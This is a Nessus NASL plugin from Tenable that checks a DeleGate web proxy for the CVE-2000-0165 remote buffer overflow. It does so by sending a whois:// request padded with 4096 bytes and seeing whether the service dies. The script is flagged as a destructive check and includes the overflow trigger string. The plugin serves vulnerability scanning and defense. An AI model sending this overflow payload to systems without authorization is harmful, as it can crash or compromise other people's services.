#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10054);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-2000-0165");
 script_bugtraq_id(808);
 script_osvdb_id(1140, 17141);

 script_name(english:"DeleGate Multiple Function Remote Overflows");
 script_summary(english:"Determines if we can use overflow the remote web proxy"); 
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote application proxy has a buffer overflow vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:
"The version of the DeleGate proxy server has a remote buffer overflow
vulnerability.  This issue can be triggered by issuing the following
command :

  whois://a b 1 AAAA..AAAAA

A remote attacker could exploit this issue to cause a denial of
or execute arbitrary code.

There are reportedly hundreds of other remote buffer overflow
vulnerabilities in this version of DeleGate, though Nessus has not
checked for those issues" );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/1999/Nov/189"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2000/Feb/180"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of DeleGate."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/11/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/02/09");
 script_cvs_date("$Date: 2016/11/15 13:39:09 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"Firewalls"); 

 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl");
 script_require_ports("Services/http_proxy", 8080);

 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc:"http_proxy", default: 8080, exit_on_fail: 1);

soc = open_sock_tcp(port);
if (! soc) exit(1, "Cannot connect to TCP port "+port+".");

  #
  # Try a harmless request. If the connection is shut, it
  # means that the remote service does not accept to forward whois 
  # queries so we exit
  #
  
  command = string("whois://a b 1 aa\r\n\r\n");
  send(socket:soc, data:command);
  buffer = recv_line(socket:soc, length:4096);
  close(soc);
  if(!buffer)exit(0);
  
soc2 = open_sock_tcp(port);
if (! soc2) exit(1, "Cannot reconnect to TCP port "+port+".");

   command = string("whois://a b 1 ", crap(4096), "\r\n\r\n");
   send(socket:soc2, data:command);
   buffer2 = recv_line(socket:soc2, length:4096);
   close(soc2);
   if(!buffer2)
   {
    if (service_is_dead(port: port, exit: 1) > 0)
      security_hole(port); 
   }

